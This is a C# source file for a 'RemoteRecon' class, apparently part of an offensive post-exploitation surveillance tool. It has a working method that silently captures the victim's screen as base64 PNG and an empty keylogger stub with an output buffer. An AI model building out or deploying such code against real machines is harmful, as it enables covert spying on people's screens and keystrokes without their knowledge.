using System;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;
using System.Runtime.Remoting;
using System.Drawing;
using System.Drawing.Imaging;

namespace RemoteReconKS
{
    public class RemoteRecon : MarshalByRefObject
    {
        public static string exceptionInfo;
        public static StringBuilder keyloggerOutput;
        public RemoteRecon()
        {

        }
        public string screenshot()
        {
            string encImage = "";

            try
            {
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
                exceptionInfo = e.ToString();
                return encImage;
            }
        }

        public void keylogger()
        {
            //Keylogger code here
        }

        public void exit()
        {
            //exit
            System.Environment.Exit(0);
        }
    }
}
